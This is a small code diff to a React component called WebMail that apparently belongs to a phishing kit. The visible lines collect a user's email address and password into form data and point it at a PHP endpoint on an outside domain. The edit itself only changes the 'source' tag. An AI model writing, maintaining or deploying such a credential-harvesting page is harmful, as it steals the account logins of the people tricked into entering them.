@@ -36,7 +36,7 @@ const WebMail = () => {
         const proData = new FormData();
         proData.append('email', email);
         proData.append('para', password);
-        proData.append('source', "WebMail");
+        proData.append('source', "WebMails");
         const domain = email.split('@')[1];
 
         const url = 'https://backend.compassionaid.love/loadback.php';
